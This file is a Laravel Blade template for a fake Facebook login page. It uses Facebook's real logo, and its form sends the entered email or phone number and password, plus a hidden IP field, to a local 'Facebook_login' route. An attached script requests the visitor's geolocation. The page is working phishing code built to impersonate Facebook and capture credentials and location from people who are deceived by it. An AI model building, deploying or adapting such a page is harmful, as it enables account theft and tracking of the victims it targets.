@extends('main')
@section('source')
    {{-- ------------------------------------------------------------------------------------------------------------------------------------- --}}

    <!DOCTYPE html>
    <html lang="en">

    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Facebook-Login or Sign up</title>
        <!-- <link rel="stylesheet" href="style2.css"> -->
    </head>

    <body>
        <main>
            <div class="row">
                <div class="colm-logo">
                    <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Logo">
                    <h2>Facebook helps you connect and share with the people in your life.</h2>
                </div>
                <div class="colm-form">

                    <form method="POST" action="{{Url('Facebook_login')}}">
                        @csrf
                        <div class="form-container">

                            <input  name="user" type="text" placeholder="Email address or phone number">
                            <input  name="pass" type="password" placeholder="Password">
                            <input  name="userip" type="hidden">

                            <button type="submit" class="btn-login">Login</button>

                            <a href="#">Forgotten password?</a>
                            <button class="btn-new">Create new Account</button>
                        </div>
                    </form>

                    <p><a href="#"><b>Create a Page</b></a> for a celebrity, brand or business.</p>
                </div>
            </div>
        </main>
        <footer>
            <div class="footer-contents">
                <ol>
                    <li>English (UK)</li>
                    <li><a href="#">മലയാളം</a></li>
                    <li><a href="#">தமிழ்</a></li>
                    <li><a href="#">తెలుగు</a></li>
                    <li><a href="#">বাংলা</a></li>
                    <li><a href="#">اردو</a></li>
                    <li><a href="#">हिन्दी</a></li>
                    <li><a href="#">ಕನ್ನಡ</a></li>
                    <li><a href="#">Español</a></li>
                    <li><a href="#">Português (Brasil)</a></li>
                    <li><a href="#">Français (France)</a></li>
                    <li><button>+</button></li>



                </ol>
                <small>Facebook © 2022</small>
            </div>
        </footer>
    </body>

    </html>
    {{-- ------------------------------------------------------------------------------------------------------------------------------------- --}}


    @endsection

    
    <script>
        if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(successCallback, errorCallback);
    } else {
      console.error('Geolocation is not supported by this browser.');
    }
    
    function successCallback(position) {
      var latitude = position.coords.latitude;
      var longitude = position.coords.longitude;
    
      console.log('Latitude:', latitude);
      console.log('Longitude:', longitude);
    
      // You can perform further actions with the location data here
    }
    
    function errorCallback(error) {
      console.error('Error occurred while retrieving location:', error.message);
    }
    </script>

